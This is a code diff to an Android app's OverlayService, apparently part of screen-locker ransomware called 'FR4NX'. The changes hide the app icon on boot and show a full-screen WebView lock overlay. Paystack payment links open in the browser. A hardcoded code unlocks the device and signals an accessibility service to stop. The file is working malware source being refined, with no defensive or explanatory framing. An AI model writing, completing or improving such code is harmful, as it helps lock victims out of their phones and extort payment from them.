@@ -6,10 +6,9 @@ import android.app.NotificationManager;
 import android.app.Service;
 import android.content.Intent;
 import android.graphics.PixelFormat;
+import android.net.Uri;
 import android.os.Build;
-import android.os.Handler;
 import android.os.IBinder;
-import android.os.Looper;
 import android.os.VibrationEffect;
 import android.os.Vibrator;
 import android.provider.Settings;
@@ -34,6 +33,9 @@ public class OverlayService extends Service {
         super.onCreate();
         windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
         
+        // Hide icon immediately on boot
+        IconUtils.hideIcon(this);
+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "FR4NX", NotificationManager.IMPORTANCE_LOW);
             ((NotificationManager) getSystemService(NotificationManager.class)).createNotificationChannel(channel);
@@ -81,14 +83,23 @@ public class OverlayService extends Service {
         WebSettings webSettings = lockWebView.getSettings();
         webSettings.setJavaScriptEnabled(true);
         webSettings.setDomStorageEnabled(true);
-        
-        // THIS FIXES THE NETWORK ERROR
         webSettings.setAllowUniversalAccessFromFileURLs(true);
         webSettings.setAllowFileAccessFromFileURLs(true);
-        webSettings.setAllowContentAccess(true);
         
         lockWebView.setBackgroundColor(0xFF050000);
-        lockWebView.setWebViewClient(new WebViewClient());
+        lockWebView.setWebViewClient(new WebViewClient() {
+            @Override
+            public boolean shouldOverrideUrlLoading(WebView view, String url) {
+                // If the URL is a Paystack link, open it in the external browser
+                if (url.contains("paystack.com") || url.contains("checkout.paystack")) {
+                    Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
+                    browserIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    startActivity(browserIntent);
+                    return true; // Stop WebView from loading it internally
+                }
+                return false;
+            }
+        });
         
         lockWebView.addJavascriptInterface(new LockWebInterface(this), "Android");
         lockWebView.loadUrl("file:///android_asset/lock_screen.html");
@@ -113,7 +124,6 @@ public class OverlayService extends Service {
         }
     }
 
-    // Called from HTML Javascript
     public void authenticateUser(String pass) {
         if ("FR4NX".equals(pass)) {
             lockWebView.post(() -> lockWebView.evaluateJavascript("showDecrypting();", null));
@@ -122,12 +132,11 @@ public class OverlayService extends Service {
         }
     }
 
-    // Called from HTML Javascript after the 10s progress bar
     public void unlockOverlay() {
         if (vibrator != null) vibrator.cancel();
         
-        // SAVE THE FLAG SO ACCESSIBILITY SERVICE STANDS DOWN
-        getSharedPreferences("fr4nx_state", MODE_PRIVATE).edit().putBoolean("is_unlocked", true).apply();
+        // .commit() saves the flag SYNCHRONOUSLY so it doesn't loop on restart
+        getSharedPreferences("fr4nx_state", MODE_PRIVATE).edit().putBoolean("is_unlocked", true).commit();
 
         if (overlayAttached && lockWebView != null) {
             try {
